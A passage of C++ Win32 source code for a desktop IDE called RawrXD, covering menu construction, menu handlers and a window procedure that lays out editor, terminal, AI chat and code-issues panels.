    AppendMenu(hEditMenu, MF_STRING, ID_EDIT_PASTE, L"&Paste\tCtrl+V");
    AppendMenu(hEditMenu, MF_SEPARATOR, 0, nullptr);
    AppendMenu(hEditMenu, MF_STRING, ID_EDIT_FIND, L"&Find...\tCtrl+F");
    AppendMenu(hEditMenu, MF_STRING, ID_EDIT_REPLACE, L"&Replace...\tCtrl+H");
    AppendMenu(hEditMenu, MF_SEPARATOR, 0, nullptr);
    AppendMenu(hEditMenu, MF_STRING, ID_EDIT_SELECT_ALL, L"Select &All\tCtrl+A");
    AppendMenu(hEditMenu, MF_STRING, ID_EDIT_MULTICURSOR, L"&Multi-Cursor Mode\tCtrl+Alt+M");
    AppendMenu(hEditMenu, MF_STRING, ID_EDIT_COLUMN_MODE, L"&Column Selection\tAlt+Shift+I");
    AppendMenu(hMenuBar, MF_POPUP, (UINT_PTR)hEditMenu, L"&Edit");
    
    // View Menu - check state matches actual visibility flags
    HMENU hViewMenu = CreatePopupMenu();
    AppendMenu(hViewMenu, MF_STRING | MF_CHECKED, ID_VIEW_FILETREE, L"&File Explorer");
    AppendMenu(hViewMenu, MF_STRING | MF_CHECKED, ID_VIEW_OUTPUT, L"&Output");
    AppendMenu(hViewMenu, MF_STRING | MF_UNCHECKED, ID_VIEW_TERMINAL, L"&Terminal");
    AppendMenu(hViewMenu, MF_STRING | MF_UNCHECKED, ID_VIEW_CHAT, L"&Chat");
    AppendMenu(hViewMenu, MF_STRING | MF_UNCHECKED, ID_VIEW_ISSUES, L"&Issues");
    AppendMenu(hViewMenu, MF_SEPARATOR, 0, nullptr);
    AppendMenu(hViewMenu, MF_STRING | MF_CHECKED, ID_VIEW_MINIMAP, L"&Minimap\tCtrl+M");
    AppendMenu(hViewMenu, MF_STRING | MF_CHECKED, ID_VIEW_FOLDING, L"Code &Folding\tCtrl+K");
    AppendMenu(hMenuBar, MF_POPUP, (UINT_PTR)hViewMenu, L"&View");
    
    // AI Menu
    HMENU hAIMenu = CreatePopupMenu();
    AppendMenu(hAIMenu, MF_STRING, ID_AI_COMPLETE, L"&Code Completion\tCtrl+Space");
    AppendMenu(hAIMenu, MF_STRING, ID_AI_EXPLAIN, L"&Explain Code\tCtrl+E");
    AppendMenu(hAIMenu, MF_STRING, ID_AI_REFACTOR, L"&Refactor\tCtrl+R");
    AppendMenu(hAIMenu, MF_STRING, ID_AI_FIX, L"&Fix Code");
    AppendMenu(hAIMenu, MF_SEPARATOR, 0, nullptr);
    AppendMenu(hAIMenu, MF_STRING, ID_AI_LOADMODEL, L"&Load Model...");
    AppendMenu(hAIMenu, MF_STRING, ID_AI_LOAD_GGUF, L"Load &GGUF Model...");
    AppendMenu(hAIMenu, MF_STRING, ID_AI_UNLOADMODEL, L"&Unload Model");
    AppendMenu(hMenuBar, MF_POPUP, (UINT_PTR)hAIMenu, L"&AI");
    
    // Build Menu
    HMENU hBuildMenu = CreatePopupMenu();
    AppendMenu(hBuildMenu, MF_STRING, ID_BUILD_COMPILE, L"&Compile\tF7");
    AppendMenu(hBuildMenu, MF_STRING, ID_BUILD_RUN, L"&Run\tF5");
    AppendMenu(hBuildMenu, MF_STRING, ID_BUILD_DEBUG, L"&Debug\tF9");
    AppendMenu(hBuildMenu, MF_SEPARATOR, 0, nullptr);
    AppendMenu(hBuildMenu, MF_STRING, ID_BUILD_DLLS, L"&Compile Missing DLLs...");
    AppendMenu(hBuildMenu, MF_SEPARATOR, 0, nullptr);
    AppendMenu(hBuildMenu, MF_STRING, ID_BUILD_CAR_ENCRYPT, L"Carmilla: &Encrypt to .car");
    AppendMenu(hBuildMenu, MF_STRING, ID_BUILD_CAR_DEPLOY, L"Carmilla: D&eploy .car at Runtime");
    AppendMenu(hMenuBar, MF_POPUP, (UINT_PTR)hBuildMenu, L"&Build");
    
    // Help Menu
    HMENU hHelpMenu = CreatePopupMenu();
    AppendMenu(hHelpMenu, MF_STRING, ID_HELP_ABOUT, L"&About RawrXD IDE...");
    AppendMenu(hMenuBar, MF_POPUP, (UINT_PTR)hHelpMenu, L"&Help");
    
    return hMenuBar;
}

void CreateMenuBar(HWND hwnd) {
    HMENU hMenu = CreateMainMenu();
    SetMenu(hwnd, hMenu);
}

// ============================================================================
// Standalone Menu Handler Functions
// ============================================================================
void HandleFileMenu(HWND hwnd, UINT id) {
    switch (id) {
        case ID_FILE_NEW:
            CreateNewTab();
            break;
        case ID_FILE_OPEN:
            {
                OPENFILENAME ofn = {0};
                wchar_t szFile[MAX_PATH] = {0};
                ofn.lStructSize = sizeof(ofn);
                ofn.hwndOwner = hwnd;
                ofn.lpstrFile = szFile;
                ofn.nMaxFile = MAX_PATH;
                ofn.lpstrFilter = L"All Files\0*.*\0C++ Files\0*.cpp;*.h;*.hpp\0Text Files\0*.txt\0";
                ofn.nFilterIndex = 1;
                ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
                if (GetOpenFileName(&ofn)) {
                    OpenFile(szFile);
                }
            }
            break;
        case ID_FILE_SAVE:
            SaveCurrentFile();
            break;
        case ID_FILE_SAVEAS:
            SaveFileAs();
            break;
        case ID_FILE_CLOSE:
            if (g_activeTab >= 0) CloseTab(g_activeTab);
            break;
        case ID_FILE_EXIT:
            PostMessage(hwnd, WM_CLOSE, 0, 0);
            break;
    }
}

void HandleEditMenu(HWND hwnd, UINT id) {
    if (!g_hwndEditor) return;
    
    switch (id) {
        case ID_EDIT_UNDO:
            SendMessage(g_hwndEditor, EM_UNDO, 0, 0);
            break;
        case ID_EDIT_REDO:
            SendMessage(g_hwndEditor, EM_REDO, 0, 0);
            break;
        case ID_EDIT_CUT:
            SendMessage(g_hwndEditor, WM_CUT, 0, 0);
            break;
        case ID_EDIT_COPY:
            SendMessage(g_hwndEditor, WM_COPY, 0, 0);
            break;
        case ID_EDIT_PASTE:
            SendMessage(g_hwndEditor, WM_PASTE, 0, 0);
            break;
        case ID_EDIT_FIND:
            ShowFindDialog();
            break;
        case ID_EDIT_REPLACE:
            ShowReplaceDialog();
            break;
        case ID_EDIT_SELECT_ALL:
            if (g_hwndEditor) SendMessage(g_hwndEditor, EM_SETSEL, 0, -1);
            break;
        case ID_EDIT_MULTICURSOR:
            if (g_multiCursorMode) {
                DisableMultiCursorMode();
            } else {
                EnableMultiCursorMode();
            }
            break;
        case ID_EDIT_COLUMN_MODE:
            if (g_columnSelectionMode) {
                DisableColumnSelectionMode();
            } else {
                EnableColumnSelectionMode();
            }
            break;
    }
}

void HandleViewMenu(HWND hwnd, UINT id) {
    switch (id) {
        case ID_VIEW_FILETREE:
            g_bFileTreeVisible = !g_bFileTreeVisible;
            SendMessage(hwnd, WM_SIZE, 0, 0);
            break;
        case ID_VIEW_OUTPUT:
            g_bOutputVisible = !g_bOutputVisible;
            SendMessage(hwnd, WM_SIZE, 0, 0);
            break;
        case ID_VIEW_TERMINAL:
            g_bTerminalVisible = !g_bTerminalVisible;
            SendMessage(hwnd, WM_SIZE, 0, 0);
            break;
        case ID_VIEW_CHAT:
            g_bChatVisible = !g_bChatVisible;
            SendMessage(hwnd, WM_SIZE, 0, 0);
            break;
        case ID_VIEW_ISSUES:
            g_bIssuesVisible = !g_bIssuesVisible;
            SendMessage(hwnd, WM_SIZE, 0, 0);
            break;
        case ID_VIEW_MINIMAP:
            ToggleMinimap();
            break;
        case ID_VIEW_FOLDING:
            if (g_codeFoldingEnabled) {
                ToggleAllFolding();
            } else {
                InitializeCodeFolding();
                g_codeFoldingEnabled = true;
            }
            break;
    }
}

void HandleAIMenu(HWND hwnd, UINT id) {
    switch (id) {
        case ID_AI_COMPLETE:
            TriggerAICompletion();
            break;
        case ID_AI_EXPLAIN:
            ExplainSelectedCode();
            break;
        case ID_AI_REFACTOR:
            RefactorSelectedCode();
            break;
        case ID_AI_LOADMODEL:
            AI_LoadModel();
            break;
        case ID_AI_FIX:
            AI_FixCode();
            break;
        case ID_AI_LOAD_GGUF:
            LoadGGUFModel();
            break;
    }
}

void HandleBuildMenu(HWND hwnd, UINT id) {
    switch (id) {
        case ID_BUILD_COMPILE:
            CompileCurrentFile();
            break;
        case ID_BUILD_RUN:
            RunCurrentFile();
            break;
        case ID_BUILD_DEBUG:
            DebugCurrentFile();
            break;
        case ID_BUILD_DLLS:
            CompileMissingDLLs();
            break;
        case ID_BUILD_CAR_ENCRYPT:
            CarmillaEncryptFile();
            break;
        case ID_BUILD_CAR_DEPLOY:
            CarmillaDeployCar();
            break;
    }
}

// ============================================================================
// Window Procedure
// ============================================================================
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CREATE: {
        // Create fonts
        g_hFontCode = CreateFontW(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            CLEARTYPE_QUALITY, FIXED_PITCH | FF_MODERN, L"Consolas");
        g_hFontUI = CreateFontW(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
        
        // Load RichEdit
        LoadLibraryW(L"msftedit.dll");
        
        // Create editor (RichEdit)
        g_hwndEditor = CreateWindowExW(WS_EX_CLIENTEDGE, MSFTEDIT_CLASS, L"",
            WS_CHILD | WS_VISIBLE | WS_VSCROLL | WS_HSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_AUTOHSCROLL | ES_WANTRETURN,
            200, 0, 800, 500, hwnd, (HMENU)IDC_EDITOR, GetModuleHandle(nullptr), nullptr);
        SendMessageW(g_hwndEditor, WM_SETFONT, (WPARAM)g_hFontCode, TRUE);
        SendMessageW(g_hwndEditor, EM_SETTEXTMODE, TM_PLAINTEXT, 0);
        SetWindowSubclass(g_hwndEditor, EditorSubclassProc, 1, 0);
        
        // Create output panel
        g_hwndOutput = CreateWindowExW(WS_EX_CLIENTEDGE, MSFTEDIT_CLASS, L"",
            WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY,
            200, 500, 800, 200, hwnd, (HMENU)IDC_OUTPUT, GetModuleHandle(nullptr), nullptr);
        SendMessageW(g_hwndOutput, WM_SETFONT, (WPARAM)g_hFontCode, TRUE);
        SendMessageW(g_hwndOutput, EM_SETBKGNDCOLOR, 0, RGB(30, 30, 30));
        {
            CHARFORMAT2W cfOut = {};
            cfOut.cbSize = sizeof(cfOut);
            cfOut.dwMask = CFM_COLOR;
            cfOut.crTextColor = RGB(220, 220, 220);
            SendMessageW(g_hwndOutput, EM_SETCHARFORMAT, SCF_ALL, (LPARAM)&cfOut);
        }
        
        // Create file tree
        g_hwndFileTree = CreateWindowExW(WS_EX_CLIENTEDGE, WC_TREEVIEWW, L"",
            WS_CHILD | WS_VISIBLE | TVS_HASLINES | TVS_HASBUTTONS | TVS_LINESATROOT | TVS_SHOWSELALWAYS,
            0, 0, 200, 700, hwnd, (HMENU)IDC_FILETREE, GetModuleHandle(nullptr), nullptr);
        SendMessageW(g_hwndFileTree, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);
        // Dark theme colors for tree
        SendMessageW(g_hwndFileTree, TVM_SETBKCOLOR, 0, (LPARAM)RGB(30, 30, 30));
        SendMessageW(g_hwndFileTree, TVM_SETTEXTCOLOR, 0, (LPARAM)RGB(212, 212, 212));
        SendMessageW(g_hwndFileTree, TVM_SETLINECOLOR, 0, (LPARAM)RGB(80, 80, 80));
        
        // Create terminal panel (initially hidden — toggled via View > Terminal)
        g_hwndTerminal = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
            WS_CHILD | WS_VSCROLL | ES_MULTILINE | ES_READONLY,
            200, 500, 800, 150, hwnd, nullptr, GetModuleHandle(nullptr), nullptr);
        SendMessageW(g_hwndTerminal, WM_SETFONT, (WPARAM)g_hFontCode, TRUE);
        
        // Create chat panel container (initially hidden — toggled via View > Chat)
        g_hwndChatPanel = CreateWindowExW(0, L"STATIC", nullptr,
            WS_CHILD | WS_CLIPCHILDREN,
            900, 0, 300, 700, hwnd, nullptr, GetModuleHandle(nullptr), nullptr);
        
        g_hwndChatHistory = CreateWindowExW(0, L"EDIT", nullptr,
            WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_READONLY,
            5, 5, 290, 600, g_hwndChatPanel, nullptr, GetModuleHandle(nullptr), nullptr);
        SendMessageW(g_hwndChatHistory, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);
        
        g_hwndChatInput = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", nullptr,
            WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL,
            5, 610, 200, 25, g_hwndChatPanel, nullptr, GetModuleHandle(nullptr), nullptr);
        SendMessageW(g_hwndChatInput, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);
        SetWindowSubclass(g_hwndChatInput, ChatInputSubclassProc, 0, 0);
        
        g_hwndChatSend = CreateWindowExW(0, L"BUTTON", L"Send",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            210, 610, 80, 25, g_hwndChatPanel, (HMENU)ID_CHAT_SEND, GetModuleHandle(nullptr), nullptr);
        SendMessageW(g_hwndChatSend, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);
        
        // Create Code Issues Panel (initially hidden)
        g_hwndIssuesPanel = CreateWindowExW(WS_EX_CLIENTEDGE, L"STATIC", L"",
            WS_CHILD | SS_BLACKFRAME,
            0, 0, 400, 600, hwnd, (HMENU)IDC_ISSUES_PANEL, GetModuleHandle(nullptr), nullptr);
        
        // Issues list view (VISIBLE by default)
        g_hwndIssuesList = CreateWindowExW(WS_EX_CLIENTEDGE, WC_LISTVIEWW, L"",
            WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SINGLESEL | LVS_SHOWSELALWAYS,
            5, 35, 390, 500, g_hwndIssuesPanel, (HMENU)IDC_ISSUES_LIST, GetModuleHandle(nullptr), nullptr);
        SendMessageW(g_hwndIssuesList, WM_SETFONT, (WPARAM)g_hFontUI, TRUE);
        
        // Setup issues list columns
        LVCOLUMNW col = {};
        col.mask = LVCF_TEXT | LVCF_WIDTH;
        col.cx = 60;
        col.pszText = (LPWSTR)L"Severity";
        SendMessageW(g_hwndIssuesList, LVM_INSERTCOLUMNW, 0, (LPARAM)&col);
        col.cx = 80;
        col.pszText = (LPWSTR)L"Category";
        SendMessageW(g_hwndIssuesList, LVM_INSERTCOLUMNW, 1, (LPARAM)&col);
        col.cx = 200;
        col.pszText = (LPWSTR)L"Message";
        SendMessageW(g_hwndIssuesList, LVM_INSERTCOLUMNW, 2, (LPARAM)&col);
        col.cx = 100;
        col.pszText = (LPWSTR)L"File";
        SendMessageW(g_hwndIssuesList, LVM_INSERTCOLUMNW, 3, (LPARAM)&col);
        col.cx = 50;
        col.pszText = (LPWSTR)L"Line";
        SendMessageW(g_hwndIssuesList, LVM_INSERTCOLUMNW,  4, (LPARAM)&col);
        
        // Issues filter buttons (VISIBLE by default)
        g_hwndIssuesCritical = CreateWindowExW(0, L"BUTTON", L"Critical",
            WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX | BS_PUSHLIKE,
            5, 5, 60, 25, g_hwndIssuesPanel, (HMENU)IDC_ISSUES_CRITICAL, GetModuleHandle(nullptr), nullptr);
        SendMessageW(g_hwndIssuesCritical, BM_SETCHECK, BST_CHECKED, 0);
        
        g_hwndIssuesHigh = CreateWindowExW(0, L"BUTTON", L"High",
            WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX | BS_PUSHLIKE,
            70, 5, 50, 25, g_hwndIssuesPanel, (HMENU)IDC_ISSUES_HIGH, GetModuleHandle(nullptr), nullptr);
        SendMessageW(g_hwndIssuesHigh, BM_SETCHECK, BST_CHECKED, 0);
        
        g_hwndIssuesMedium = CreateWindowExW(0, L"BUTTON", L"Medium",
            WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX | BS_PUSHLIKE,
            125, 5, 60, 25, g_hwndIssuesPanel, (HMENU)IDC_ISSUES_MEDIUM, GetModuleHandle(nullptr), nullptr);
        SendMessageW(g_hwndIssuesMedium, BM_SETCHECK, BST_CHECKED, 0);
        
        g_hwndIssuesLow = CreateWindowExW(0, L"BUTTON", L"Low",
            WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX | BS_PUSHLIKE,
            190, 5, 45, 25, g_hwndIssuesPanel, (HMENU)IDC_ISSUES_LOW, GetModuleHandle(nullptr), nullptr);
        SendMessageW(g_hwndIssuesLow, BM_SETCHECK, BST_CHECKED, 0);
        
        g_hwndIssuesInfo = CreateWindowExW(0, L"BUTTON", L"Info",
            WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX | BS_PUSHLIKE,
            240, 5, 40, 25, g_hwndIssuesPanel, (HMENU)IDC_ISSUES_INFO, GetModuleHandle(nullptr), nullptr);
        SendMessageW(g_hwndIssuesInfo, BM_SETCHECK, BST_CHECKED, 0);
        
        // Issues action buttons
        CreateWindowExW(0, L"BUTTON", L"Refresh", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            285, 5, 50, 25, g_hwndIssuesPanel, (HMENU)IDC_ISSUES_REFRESH, GetModuleHandle(nullptr), nullptr);
        CreateWindowExW(0, L"BUTTON", L"Export", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            340, 5, 50, 25, g_hwndIssuesPanel, (HMENU)IDC_ISSUES_EXPORT, GetModuleHandle(nullptr), nullptr);
        
        // Issues status bar (VISIBLE by default)
        CreateWindowExW(0, L"STATIC", L"No issues found", WS_CHILD | WS_VISIBLE | SS_LEFT,
            5, 540, 300, 20, g_hwndIssuesPanel, nullptr, GetModuleHandle(nullptr), nullptr);
        
        // Create status bar
        g_hwndStatusBar = CreateWindowExW(0, STATUSCLASSNAMEW, L"Ready",
            WS_CHILD | WS_VISIBLE | SBARS_SIZEGRIP,
            0, 0, 0, 0, hwnd, (HMENU)IDC_STATUSBAR, GetModuleHandle(nullptr), nullptr);
        
        // Set menu
        SetMenu(hwnd, CreateMainMenu());
        
        AppendWindowText(g_hwndOutput, L"[System] RawrXD IDE started. Use File > Open to load a file.\r\n");
        g_hwndMain = hwnd;  // Must set before pipe thread starts
        StartTestHarness();
        
        // Auto-populate file tree with exe's directory
        {
            wchar_t exePath[MAX_PATH] = {0};
            GetModuleFileNameW(nullptr, exePath, MAX_PATH);
            std::wstring exeDir(exePath);
            size_t lastSlash = exeDir.find_last_of(L"\\/");
            if (lastSlash != std::wstring::npos) exeDir = exeDir.substr(0, lastSlash);
            g_workspaceRoot = exeDir;
            PopulateFileTree(exeDir);
            std::wstring title = L"RawrXD IDE - " + exeDir;
            SetWindowTextW(hwnd, title.c_str());
        }
        break;
    }
    
    case WM_SIZE: {
        RECT rc;
        GetClientRect(hwnd, &rc);
        int width = rc.right - rc.left;
        int height = rc.bottom - rc.top;
        
        // Status bar
        SendMessageW(g_hwndStatusBar, WM_SIZE, 0, 0);
        RECT sbRect;
        GetWindowRect(g_hwndStatusBar, &sbRect);
        int sbHeight = sbRect.bottom - sbRect.top;
        int usableHeight = height - sbHeight;
        
        // Panel dimensions
        int treeWidth = g_bFileTreeVisible ? 200 : 0;
        int issuesWidth = g_bIssuesVisible ? 400 : 0;
        int chatWidth = g_bChatVisible ? 300 : 0;
        int bottomHeight = (g_bOutputVisible || g_bTerminalVisible) ? 150 : 0;
        int centerWidth = width - treeWidth - issuesWidth - chatWidth;
        if (centerWidth < 100) centerWidth = 100;
        int editorHeight = usableHeight - bottomHeight;
        if (editorHeight < 50) editorHeight = 50;
        
        // File tree (left)
        if (g_hwndFileTree) {
            if (g_bFileTreeVisible) {
                MoveWindow(g_hwndFileTree, 0, 0, treeWidth, usableHeight, TRUE);
                ShowWindow(g_hwndFileTree, SW_SHOW);
            } else {
                ShowWindow(g_hwndFileTree, SW_HIDE);
            }
        }
        
        // Editor (center top)
        if (g_hwndEditor)
            MoveWindow(g_hwndEditor, treeWidth, 0, centerWidth, editorHeight, TRUE);
        
        // Output panel (center bottom — hidden when terminal is shown)
        if (g_hwndOutput) {
            if (g_bOutputVisible && !g_bTerminalVisible) {
                MoveWindow(g_hwndOutput, treeWidth, editorHeight, centerWidth, bottomHeight, TRUE);
                ShowWindow(g_hwndOutput, SW_SHOW);
            } else {
                ShowWindow(g_hwndOutput, SW_HIDE);
            }
        }
        
        // Terminal panel (center bottom — replaces output when shown)
        if (g_hwndTerminal) {
            if (g_bTerminalVisible) {
                MoveWindow(g_hwndTerminal, treeWidth, editorHeight, centerWidth, bottomHeight, TRUE);
                ShowWindow(g_hwndTerminal, SW_SHOW);
            } else {
                ShowWindow(g_hwndTerminal, SW_HIDE);
            }
        }
        
        // Chat panel (right side)
        if (g_hwndChatPanel) {
            if (g_bChatVisible) {
                int chatX = treeWidth + centerWidth;
                MoveWindow(g_hwndChatPanel, chatX, 0, chatWidth, usableHeight, TRUE);
                ShowWindow(g_hwndChatPanel, SW_SHOW);
                // Layout chat sub-controls within panel
                int chatInnerW = chatWidth - 10;
                int inputH = 25;
                int sendW = 80;
                int histH = usableHeight - inputH - 15;
                if (g_hwndChatHistory) MoveWindow(g_hwndChatHistory, 5, 5, chatInnerW, histH, TRUE);
                if (g_hwndChatInput) MoveWindow(g_hwndChatInput, 5, histH + 10, chatInnerW - sendW - 5, inputH, TRUE);
                if (g_hwndChatSend) MoveWindow(g_hwndChatSend, chatInnerW - sendW + 5, histH + 10, sendW, inputH, TRUE);
            } else {
                ShowWindow(g_hwndChatPanel, SW_HIDE);
            }
        }
        
        // Issues panel (far right)
        if (g_hwndIssuesPanel) {
            if (g_bIssuesVisible) {
                int issuesX = width - issuesWidth;
                MoveWindow(g_hwndIssuesPanel, issuesX, 0, issuesWidth, usableHeight, TRUE);
                ShowWindow(g_hwndIssuesPanel, SW_SHOW);
            } else {
                ShowWindow(g_hwndIssuesPanel, SW_HIDE);
            }
        }
        break;
    }
    
    case WM_COMMAND: {
        int wmId = LOWORD(wParam);
        int wmEvent = HIWORD(wParam);

        // Handle editor changes for syntax highlighting and AI completion
        if (wmId == IDC_EDITOR && wmEvent == EN_CHANGE) {
            static DWORD lastChangeTime = 0;
            DWORD currentTime = GetTickCount();
            
            // Debounce syntax highlighting to avoid excessive calls
            if (currentTime - lastChangeTime > 500) { // 500ms delay for better performance
                lastChangeTime = currentTime;
                PostMessage(hwnd, WM_USER + 1, 0, 0); // Defer highlighting
            }
        }

        switch (wmId) {
        case IDM_FILE_NEW:
            SetWindowTextW(g_hwndEditor, L"");
            g_currentFile.clear();
            g_isDirty = false;
            SetWindowTextW(hwnd, L"RawrXD IDE - New File");
            break;
            
        case IDM_FILE_OPEN: {
            std::wstring path = OpenFileDialog(hwnd);
            if (!path.empty() && !LoadFile(path)) {
                MessageBoxW(hwnd, L"Failed to load file.", L"Error", MB_OK | MB_ICONERROR);
            }
            break;
        }
        
        case IDM_FILE_SAVE:
            if (g_currentFile.empty()) {
                std::wstring path = SaveFileDialog(hwnd);
                if (!path.empty() && !SaveFile(path)) {
                    MessageBoxW(hwnd, L"Failed to save file.", L"Error", MB_OK | MB_ICONERROR);
                }
            } else {
                if (!SaveFile(g_currentFile)) {
                    MessageBoxW(hwnd, L"Failed to save file.", L"Error", MB_OK | MB_ICONERROR);
                }
            }
            break;
            
        case IDM_FILE_SAVEAS: {
            std::wstring path = SaveFileDialog(hwnd);
            if (!path.empty() && !SaveFile(path)) {
                MessageBoxW(hwnd, L"Failed to save file.", L"Error", MB_OK | MB_ICONERROR);
            }
            break;
        }
        
        case IDM_FILE_EXIT:
            PostMessage(hwnd, WM_CLOSE, 0, 0);
            break;

        case IDM_FILE_OPENFOLDER: {
            std::wstring folder = BrowseFolderDialog(hwnd);
            if (!folder.empty()) {
                g_workspaceRoot = folder;
                PopulateFileTree(folder);
                g_bFileTreeVisible = true;
                CheckMenuItem(GetMenu(hwnd), IDM_VIEW_FILETREE, MF_CHECKED);
                SendMessage(hwnd, WM_SIZE, 0, 0);
                std::wstring title = L"RawrXD IDE - " + folder;
                SetWindowTextW(hwnd, title.c_str());
                AppendWindowText(g_hwndOutput, (L"[Workspace] Opened: " + folder + L"\r\n").c_str());
            }
            break;
        }
            
        case IDM_EDIT_UNDO:
            SendMessageW(g_hwndEditor, WM_UNDO, 0, 0);
            break;
        case IDM_EDIT_CUT:
            SendMessageW(g_hwndEditor, WM_CUT, 0, 0);
            break;
        case IDM_EDIT_COPY:
            SendMessageW(g_hwndEditor, WM_COPY, 0, 0);
            break;
        case IDM_EDIT_PASTE:
            SendMessageW(g_hwndEditor, WM_PASTE, 0, 0);
            break;
            
        // View menu
        case IDM_VIEW_OUTPUT:
            g_bOutputVisible = !g_bOutputVisible;
            if (g_bOutputVisible) g_bTerminalVisible = false;  // Only one bottom panel at a time
            CheckMenuItem(GetMenu(hwnd), IDM_VIEW_OUTPUT, g_bOutputVisible ? MF_CHECKED : MF_UNCHECKED);
            CheckMenuItem(GetMenu(hwnd), IDM_VIEW_TERMINAL, g_bTerminalVisible ? MF_CHECKED : MF_UNCHECKED);
            SendMessage(hwnd, WM_SIZE, 0, 0);  // Trigger relayout
            break;
            
        case IDM_VIEW_TERMINAL:
            g_bTerminalVisible = !g_bTerminalVisible;
            if (g_bTerminalVisible) {
                g_bOutputVisible = false;  // Only one bottom panel at a time
                if (!g_hCmdProcess) {
                    if (StartTerminal()) {
                        AppendWindowText(g_hwndTerminal, L"PowerShell Terminal\r\n> ");
                    }
                }
            }
            CheckMenuItem(GetMenu(hwnd), IDM_VIEW_TERMINAL, g_bTerminalVisible ? MF_CHECKED : MF_UNCHECKED);
            CheckMenuItem(GetMenu(hwnd), IDM_VIEW_OUTPUT, g_bOutputVisible ? MF_CHECKED : MF_UNCHECKED);
            SendMessage(hwnd, WM_SIZE, 0, 0);  // Trigger relayout
            break;
            
        case IDM_VIEW_CHAT:
            g_bChatVisible = !g_bChatVisible;
            CheckMenuItem(GetMenu(hwnd), IDM_VIEW_CHAT, g_bChatVisible ? MF_CHECKED : MF_UNCHECKED);
            SendMessage(hwnd, WM_SIZE, 0, 0);  // Trigger relayout
            if (g_bChatVisible) {
                AppendWindowText(g_hwndChatHistory, L"[AI Chat] Ready. Type a message below.\r\n");
                
                // Auto-start Python chat server if not already running
                if (!g_chatServerRunning) {
                    AppendWindowText(g_hwndChatHistory, L"[AI Chat] Starting Python server...\r\n");
                    if (StartChatServer()) {
                        AppendWindowText(g_hwndChatHistory, L"[AI Chat] Python server started successfully.\r\n");
                    } else {
                        AppendWindowText(g_hwndChatHistory, L"[AI Chat] Failed to start Python server.\r\n");
                    }
                }
            }
            break;
            
        case IDM_VIEW_ISSUES:
            g_bIssuesVisible = !g_bIssuesVisible;
            CheckMenuItem(GetMenu(hwnd), IDM_VIEW_ISSUES, g_bIssuesVisible ? MF_CHECKED : MF_UNCHECKED);
            SendMessage(hwnd, WM_SIZE, 0, 0);  // Trigger relayout
            if (g_bIssuesVisible) {
                RefreshCodeIssues();
            }
            break;
            
        case IDM_BUILD_RUN:
            Build_Run();
            break;
        case IDM_BUILD_BUILD:
            Build_Build();
            break;
            
        case IDM_AI_EXPLAIN:
            AI_ExplainCode();
            break;
        case IDM_AI_REFACTOR:
            AI_RefactorCode();
            break;

        // Issues panel controls
        case IDC_ISSUES_CRITICAL:
            g_bShowCritical = !g_bShowCritical;
            FilterIssuesBySeverity();
            break;
        case IDC_ISSUES_HIGH:
            g_bShowHigh = !g_bShowHigh;
            FilterIssuesBySeverity();
            break;
        case IDC_ISSUES_MEDIUM:
            g_bShowMedium = !g_bShowMedium;
            FilterIssuesBySeverity();
            break;
        case IDC_ISSUES_LOW:
            g_bShowLow = !g_bShowLow;
            FilterIssuesBySeverity();
            break;
        case IDC_ISSUES_INFO:
            g_bShowInfo = !g_bShowInfo;
            FilterIssuesBySeverity();
            break;
        case IDC_ISSUES_REFRESH:
            RefreshCodeIssues();
            break;
        case IDC_ISSUES_EXPORT:
            ExportIssues();
            break;
        case IDC_ISSUES_CLEAR:
            ClearCodeIssues();
            break;

        case IDM_AI_LOADMODEL:
            AI_LoadModel();
            break;
            
        case IDM_AI_LOADGGUF:
            LoadGGUFModel();
            break;
        
        case IDM_AI_UNLOADMODEL:
            AI_UnloadModel();
            break;
            
        case IDM_HELP_ABOUT:
            MessageBoxW(hwnd, 
                L"RawrXD IDE v1.0\n\n"
                L"Pure Win32 Autonomous Agentic IDE\n"
                L"Zero Qt Dependencies\n\n"
                L"Powered by Titan Kernel (GGUF Inference)\n"
                L"(c) 2026 RawrXD Project",
                L"About RawrXD IDE", MB_OK | MB_ICONINFORMATION);
            break;
        
        // --- File menu (missing) ---
        case IDM_FILE_CLOSE:
            SetWindowTextW(g_hwndEditor, L"");
            g_currentFile.clear();
            g_isDirty = false;
            SetWindowTextW(hwnd, L"RawrXD IDE");
            break;
        
        // --- Edit menu (missing) ---
        case IDM_EDIT_REDO:
            SendMessageW(g_hwndEditor, EM_REDO, 0, 0);
            break;
        case IDM_EDIT_FIND:
            ShowFindDialog();
            break;
        case ID_EDIT_REPLACE:
            ShowReplaceDialog();
            break;
        case ID_EDIT_SELECT_ALL:
            SendMessageW(g_hwndEditor, EM_SETSEL, 0, -1);
            break;
        case ID_EDIT_MULTICURSOR:
            if (g_multiCursorMode) DisableMultiCursorMode();
            else EnableMultiCursorMode();
            break;
        case ID_EDIT_COLUMN_MODE:
            if (g_columnSelectionMode) DisableColumnSelectionMode();
            else EnableColumnSelectionMode();
            break;
        
